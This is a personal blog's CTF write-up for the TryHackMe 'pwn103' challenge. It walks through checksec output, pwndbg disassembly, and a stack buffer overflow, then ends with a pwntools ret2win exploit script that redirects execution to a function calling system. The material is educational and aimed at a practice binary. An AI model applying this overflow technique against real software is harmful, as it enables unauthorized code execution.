@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="theme-color" content="#1b1b1b">
+	<title>pwn103 | Dexter</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		
+  <meta itemprop="name" content="pwn103">
+  <meta itemprop="description" content="103 Introduction Here we are met by a ret2win challenge, what this means is that we are required to call a function which does something that is not normal, example spawn a shell or in case of a CTF it prints out the flag. We can start by doing simple binary analysis for example checking the binary protections using checksec.
+Let us break all this down bit by bit.
+Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Arch: amd64-64-little This line specifies the architecture of the binary. “amd64” refers to the x86-64 architecture, a common architecture for modern desktop and server CPUs. “64-little” indicates that it’s a 64-bit architecture (as opposed to 32-bit) and uses little-endian byte ordering.">
+  <meta itemprop="datePublished" content="2024-01-10T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-01-10T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1197">
+  <meta itemprop="keywords" content="Tryhackme">
+	<link rel="stylesheet" href="/css/bundle.css">
+	<link rel="stylesheet" href="/custom.css">
+	<link rel="icon" href="/icons/16.png" sizes="16x16" type="image/png">
+	<link rel="icon" href="/icons/32.png" sizes="32x32" type="image/png">
+</head>
+<body class="body kind-page">
+	<header class="header">
+	<a class="logo" href="/">Dexter</a>
+	
+</header>
+	<div class="primary">
+	
+	<main class="main">
+		
+		<div class="single block">
+			<article class="entry">
+				<h1 class="entry__title">pwn103</h1>
+<details class="entry__toc toc" open>
+	<summary class="toc__title">Table of Contents</summary>
+	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#103">103</a>
+      <ul>
+        <li><a href="#introduction">Introduction</a></li>
+        <li><a href="#analysis">Analysis</a></li>
+        <li><a href="#exploit">Exploit</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</details>
+				<div class="entry__content"><h2 id="103">103</h2>
+<h3 id="introduction">Introduction</h3>
+<p>Here we are met by a ret2win challenge, what this means is that we are required to call a function which does something that is not normal, example spawn a shell or in case of a CTF it prints out the flag. We can start by doing simple binary analysis for example checking the binary protections using <code>checksec</code>.</p>
+<p>Let us break all this down bit by bit.</p>
+<pre tabindex="0"><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre><p>Arch: amd64-64-little
+This line specifies the architecture of the binary. &ldquo;amd64&rdquo; refers to the x86-64 architecture, a common architecture for modern desktop and server CPUs. &ldquo;64-little&rdquo; indicates that it&rsquo;s a 64-bit architecture (as opposed to 32-bit) and uses little-endian byte ordering.</p>
+<p>RELRO: Partial RELRO
+RELRO stands for &ldquo;RELocation Read-Only.&rdquo; It&rsquo;s a security feature in the ELF (Executable and Linkable Format) binaries (commonly used in Unix-like systems). &ldquo;Partial RELRO&rdquo; means that some parts of the binary&rsquo;s memory (like the Global Offset Table - GOT) are protected from certain types of attacks, but not completely. Full RELRO provides more robust protection by making more sections read-only after the program starts.</p>
+<p>Stack: No canary found
+A stack canary is a security mechanism used to detect buffer overflows. It&rsquo;s a random value placed before the return address on the stack. &ldquo;No canary found&rdquo; means the binary doesn&rsquo;t implement this particular protection, potentially leaving it vulnerable to certain types of buffer overflow attacks.</p>
+<p>NX: NX enabled
+NX (No eXecute) is a security feature that prevents code execution from areas of memory marked as data, reducing the risk of certain types of attacks, like buffer overflow attacks that attempt to execute malicious code injected into data areas. &ldquo;NX enabled&rdquo; indicates this protection is active, which is a good security measure.</p>
+<p>PIE: No PIE (0x400000)
+PIE stands for &ldquo;Position Independent Executable.&rdquo; When PIE is enabled, the base address of the program is randomized on each execution, making it harder for attackers to predict memory addresses. &ldquo;No PIE (0x400000)&rdquo; means the binary is loaded at a fixed address (0x400000 in this case), which might make certain types of attacks easier if other vulnerabilities are present.</p>
+<p>Well since we have No Pie, this makes our life much easier since we can pass the address of the &ldquo;win&rdquo; function and call it, ret2win. We can also see that we have no canary meaning that we can actually overflow the buffer and over write the adjacent memory. With that said, now we can disassemble the binary. Here I will use be using a debugger to view the functions.</p>
+<h3 id="analysis">Analysis</h3>
+<pre tabindex="0"><code>pwndbg&gt; info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x0000000000401030  strncmp@plt
+0x0000000000401040  puts@plt
+0x0000000000401050  system@plt
+0x0000000000401060  printf@plt
+0x0000000000401070  read@plt
+0x0000000000401080  strcmp@plt
+0x0000000000401090  setvbuf@plt
+0x00000000004010a0  __isoc99_scanf@plt
+0x00000000004010b0  _start
+0x00000000004010e0  _dl_relocate_static_pie
+0x00000000004010f0  deregister_tm_clones
+0x0000000000401120  register_tm_clones
+0x0000000000401160  __do_global_dtors_aux
+0x0000000000401190  frame_dummy
+0x0000000000401196  setup
+0x00000000004011f7  rules
+0x0000000000401262  announcements
+0x00000000004012be  general
+0x0000000000401378  bot_cmd
+0x00000000004014e2  discussion
+0x000000000040153e  banner
+0x0000000000401554  admins_only
+0x000000000040158c  main
+0x0000000000401680  __libc_csu_init
+0x00000000004016e0  __libc_csu_fini
+0x00000000004016e4  _fini
+pwndbg&gt; 
+</code></pre><p>Interesting enough we can set our focus to this functions first.</p>
+<pre tabindex="0"><code>0x0000000000401196  setup
+0x00000000004011f7  rules
+0x0000000000401262  announcements
+0x00000000004012be  general
+0x0000000000401378  bot_cmd
+0x00000000004014e2  discussion
+0x000000000040153e  banner
+0x0000000000401554  admins_only
+0x000000000040158c  main
+</code></pre><p>So we can see that we have a very interesting functions named admins_only hmm can this be our win function? We can then disassemble this function in our debugger.</p>
+<pre tabindex="0"><code>pwndbg&gt; disass admins_only 
+Dump of assembler code for function admins_only:
+   0x0000000000401554 &lt;+0&gt;:	push   rbp
+   0x0000000000401555 &lt;+1&gt;:	mov    rbp,rsp
+   0x0000000000401558 &lt;+4&gt;:	sub    rsp,0x10
+   0x000000000040155c &lt;+8&gt;:	lea    rax,[rip+0x1d04]        # 0x403267
+   0x0000000000401563 &lt;+15&gt;:	mov    rdi,rax
+   0x0000000000401566 &lt;+18&gt;:	call   0x401040 &lt;puts@plt&gt;
+   0x000000000040156b &lt;+23&gt;:	lea    rax,[rip+0x1d0a]        # 0x40327c
+   0x0000000000401572 &lt;+30&gt;:	mov    rdi,rax
+   0x0000000000401575 &lt;+33&gt;:	call   0x401040 &lt;puts@plt&gt;
+   0x000000000040157a &lt;+38&gt;:	lea    rax,[rip+0x1d0e]        # 0x40328f
+   0x0000000000401581 &lt;+45&gt;:	mov    rdi,rax
+   0x0000000000401584 &lt;+48&gt;:	call   0x401050 &lt;system@plt&gt;
+   0x0000000000401589 &lt;+53&gt;:	nop
+   0x000000000040158a &lt;+54&gt;:	leave
+   0x000000000040158b &lt;+55&gt;:	ret
+End of assembler dump.
+</code></pre><p>Ah yes we can see that we have a call to system, what this does is call system.
+So after we have everything we need we can come up with an exploit. We can first run the binary to see how it runs normaly.</p>
+<p><img src="https://i.ibb.co/DLvBbC0/intro.png" alt="5"></p>
+<p>So going to option 3 we can get a hint that there is where we have the vuln.</p>
+<p>We can then disassemble the general function in pwndbg again.</p>
+<pre tabindex="0"><code>0x00000000004012be &lt;+0&gt;:	push   rbp
+   0x00000000004012bf &lt;+1&gt;:	mov    rbp,rsp
+   0x00000000004012c2 &lt;+4&gt;:	sub    rsp,0x20
+   0x00000000004012c6 &lt;+8&gt;:	lea    rax,[rip+0x10dd]        # 0x4023aa
+   0x00000000004012cd &lt;+15&gt;:	mov    rdi,rax
+   0x00000000004012d0 &lt;+18&gt;:	call   0x401040 &lt;puts@plt&gt;
+   0x00000000004012d5 &lt;+23&gt;:	lea    rax,[rip+0x10e4]        # 0x4023c0
+   0x00000000004012dc &lt;+30&gt;:	mov    rdi,rax
+   0x00000000004012df &lt;+33&gt;:	call   0x401040 &lt;puts@plt&gt;
+   0x00000000004012e4 &lt;+38&gt;:	lea    rax,[rip+0x10fd]        # 0x4023e8
+   0x00000000004012eb &lt;+45&gt;:	mov    rdi,rax
+   0x00000000004012ee &lt;+48&gt;:	call   0x401040 &lt;puts@plt&gt;
+   0x00000000004012f3 &lt;+53&gt;:	lea    rax,[rip+0x111e]        # 0x402418
+   0x00000000004012fa &lt;+60&gt;:	mov    rdi,rax
+   0x00000000004012fd &lt;+63&gt;:	call   0x401040 &lt;puts@plt&gt;
+   0x0000000000401302 &lt;+68&gt;:	lea    rax,[rip+0x1143]        # 0x40244c
+   0x0000000000401309 &lt;+75&gt;:	mov    rdi,rax
+   0x000000000040130c &lt;+78&gt;:	mov    eax,0x0
+   0x0000000000401311 &lt;+83&gt;:	call   0x401060 &lt;printf@plt&gt;
+   0x0000000000401316 &lt;+88&gt;:	lea    rax,[rbp-0x20]
+   0x000000000040131a &lt;+92&gt;:	mov    rsi,rax
+   0x000000000040131d &lt;+95&gt;:	lea    rax,[rip+0x1138]        # 0x40245c
+   0x0000000000401324 &lt;+102&gt;:	mov    rdi,rax
+   0x0000000000401327 &lt;+105&gt;:	mov    eax,0x0
+   0x000000000040132c &lt;+110&gt;:	call   0x4010a0 &lt;__isoc99_scanf@plt&gt;
+   0x0000000000401331 &lt;+115&gt;:	lea    rax,[rbp-0x20]
+   0x0000000000401335 &lt;+119&gt;:	lea    rdx,[rip+0x1123]        # 0x40245f
+   0x000000000040133c &lt;+126&gt;:	mov    rsi,rdx
+   0x000000000040133f &lt;+129&gt;:	mov    rdi,rax
+   0x0000000000401342 &lt;+132&gt;:	call   0x401080 &lt;strcmp@plt&gt;
+   0x0000000000401347 &lt;+137&gt;:	test   eax,eax
+   0x0000000000401349 &lt;+139&gt;:	jne    0x401366 &lt;general+168&gt;
+   0x000000000040134b &lt;+141&gt;:	lea    rax,[rip+0x1111]        # 0x402463
+   0x0000000000401352 &lt;+148&gt;:	mov    rdi,rax
+   0x0000000000401355 &lt;+151&gt;:	call   0x401040 &lt;puts@plt&gt;
+   0x000000000040135a &lt;+156&gt;:	mov    eax,0x0
+   0x000000000040135f &lt;+161&gt;:	call   0x40158c &lt;main&gt;
+   0x0000000000401364 &lt;+166&gt;:	jmp    0x401375 &lt;general+183&gt;
+   0x0000000000401366 &lt;+168&gt;:	lea    rax,[rip+0x1112]        # 0x40247f
+   0x000000000040136d &lt;+175&gt;:	mov    rdi,rax
+   0x0000000000401370 &lt;+178&gt;:	call   0x401040 &lt;puts@plt&gt;
+   0x0000000000401375 &lt;+183&gt;:	nop
+   0x0000000000401376 &lt;+184&gt;:	leave
+   0x0000000000401377 &lt;+185&gt;:	ret
+</code></pre><p>We then need to determine the offset for the buffer at runtime. To do this, I first located the scanf and the buffer which handled all instrunctions. Considering that <code>rbp-0x20</code> is the buffer, which in bytes is 32. This means that the buffer is <code>0x20</code> or 32 bytes below the base pointer.</p>
+<p>We would now need to overwrite the return address of <code>general</code> function that was put onto the stack and make it return to our win function instead. In order to reach our return address we would need 8 more bytes making them 40 in total</p>
+<h3 id="exploit">Exploit</h3>
+<pre tabindex="0"><code>from pwn import *
+
+p = process(&#34;./pwn103.pwn103&#34;) 
+#p = remote(&#34;thm_ip&#34;, 9003)
+
+admins_addr = p64(0x401554) 
+return_addr = p64(0x401677)
+
+payload = b&#39;A&#39; * 40 # found buffer at 40
+payload += return_addr
+payload += admins_addr
+
+pause()
+
+p.sendlineafter(&#34;:&#34;, &#34;3&#34;)
+p.sendline(payload)
+p.interactive()
+</code></pre><p>Here, <code>admins_addr</code> and <code>return_addr</code> are two addresses in the binary, represented as 64-bit packed values (p64). The return function serves as the address the program will attempt to return to after completing a function call.
+The payload starts with 40 bytes of &lsquo;A&rsquo;s to fill the buffer until a potential buffer overflow point is reached. Then, it appends the return_addr followed by admins_addr in an attempt to redirect program execution to the admins_addr after overwriting the return address.</p>
+<p><code>pause()</code> is used to pause the script execution, giving you time to attach a debugger if needed before the interaction with the vulnerable program begins.
+<code>sendlineafter()</code> sends the string &ldquo;3&rdquo; to the program, which directs the program to the general channel where we found the vuln hint.
+<code>p.interactive()</code> hands over the control of the program to you interactively, allowing you to send further commands manually and explore the program&rsquo;s state after the exploit attempt.</p>
+</div>
+				
+				<footer class="entry__footer">
+					
+<div class="entry__tags">
+			<a class="entry__tag btn" href="/tags/tryhackme/">Tryhackme</a>
+</div>
+					
+<div class="entry__share share">
+	<a class="share__link btn" title="Share on Twitter" href="https://twitter.com/intent/tweet/?url=%2f%2flocalhost%3a1313%2fposts%2fthm%2fbinary103%2f&amp;text=pwn103" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on Twitter', 'width=800,height=450,resizable=yes,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="Twitter" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M437 152a72 72 0 0 1-40 12 72 72 0 0 0 32-40 72 72 0 0 1-45 17 72 72 0 0 0-122 65 200 200 0 0 1-145-74 72 72 0 0 0 22 94 72 72 0 0 1-32-7 72 72 0 0 0 56 69 72 72 0 0 1-32 1 72 72 0 0 0 67 50 200 200 0 0 1-105 29 200 200 0 0 0 309-179 200 200 0 0 0 35-37"/></svg>
+	</a>
+	<a class="share__link btn" title="Share on LinkedIn" href="https://www.linkedin.com/shareArticle?mini=true&url=%2f%2flocalhost%3a1313%2fposts%2fthm%2fbinary103%2f&title=pwn103" target="_blank" rel="noopener noreferrer" onclick="window.open(this.href, 'Share on LinkedIn', 'width=640,height=480,toolbar=0,status=0'); return false">
+		<svg class="share__icon" aria-label="LinkedIn" role="img" width="32" height="32" viewBox="0 0 512 512"><circle cx="142" cy="138" r="37"/><path stroke-width="66" d="M244 194v198M142 194v198"/><path d="M276 282c0-20 13-40 36-40 24 0 33 18 33 45v105h66V279c0-61-32-89-76-89-34 0-51 19-59 32"/></svg>
+	</a>
+</div>
+				</footer>
+				
+			</article>
+		</div>
+	</main>
+	
+<div class="authorbox block">
+	<div class="author">
+		<div class="author__body">
+			<div class="author__name">
+				Dexter
+			</div>
+			<div class="author__bio">Just human</div>
+		</div>
+	</div>
+</div>
+	
+
+
+
+<div class="related block">
+	<h3 class="related__title">Related</h3>
+	<ul class="related__list">
+		
+		<li class="related__item"><a class="related__link" href="/posts/thm/binary102/">pwn102</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/posts/thm/binary104/">pwn104</a></li>
+		
+		<li class="related__item"><a class="related__link" href="/posts/thm/binary101/">pwn101</a></li>
+		
+	</ul>
+</div>
+
+	
+
+	</div>
+	<footer class="footer">
+<div class="footer__social social">
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="mailto:dexter7isme@gmail.com">
+			<svg class="social__icon" aria-label="Email" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M299 268l124 106c-4 4-10 7-17 7H106c-7 0-13-3-17-7l124-106 43 38 43-38zm-43 13L89 138c4-4 10-7 17-7h300c7 0 13 3 17 7L256 281zm54-23l121-105v208L310 258zM81 153l121 105L81 361V153z"/></svg>
+		</a>
+		<a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/w-47">
+			<svg class="social__icon" aria-label="Github" role="img" width="32" height="32" viewBox="0 0 512 512"><path d="M335 499c14 0 12 17 12 17H165s-2-17 12-17c13 0 16-6 16-12l-1-50c-71 16-86-28-86-28-12-30-28-37-28-37-24-16 1-16 1-16 26 2 40 26 40 26 22 39 59 28 74 22 2-17 9-28 16-35-57-6-116-28-116-126 0-28 10-51 26-69-3-6-11-32 3-67 0 0 21-7 70 26 42-12 86-12 128 0 49-33 70-26 70-26 14 35 6 61 3 67 16 18 26 41 26 69 0 98-60 120-117 126 10 8 18 24 18 48l-1 70c0 6 3 12 16 12z"/></svg>
+		</a>
+</div>
+	<div class="footer__copyright">© 2025 Dexter. <span class="footer__copyright-credits">Powered by <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/vimux/binario" rel="nofollow noopener" target="_blank">Binario</a> theme.</span></div>
+</footer>
+</body>
+</html>
